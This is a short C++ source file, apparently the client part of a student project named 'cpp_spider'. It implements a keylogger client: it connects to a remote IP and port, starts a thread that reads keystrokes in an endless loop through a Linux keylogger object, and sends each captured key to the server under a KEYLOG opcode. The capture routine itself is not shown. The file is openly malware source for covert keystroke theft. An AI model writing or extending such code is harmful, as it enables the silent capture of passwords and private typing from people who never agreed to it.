/*
** Client.cpp for cpp_spider in /home/tarkick/repos/cpp_spider/src/client
**
** Made by tarkick
** Login   <tarkick@epitech.net>
**
** Started on  Sat Nov 05 19:28:05 2016 tarkick
** Last update Wed Nov 09 01:46:41 2016 tarkick
*/

#include "Client.hh"

Client::Client(std::string ip, unsigned int port) : Network<CLIENT>(ip, port,
													CLIENT)
{
	connect();
	run();
	keyloggerThread_->join();
}

Client::~Client()
{
}

void 			Client::processing()
{
	send(Net::Opcode::Client::CONNECT);
	keyloggerThread_ = new boost::thread(boost::bind(&Client::sendKeyLogs, this));
	receive();
}

void 			Client::sendKeyLogs()
{
	char 		key;

	while (true)
	{
		if ((key = keylogger_.checkLinux()))
			send(Net::Opcode::Client::KEYLOG, key);
	}
}
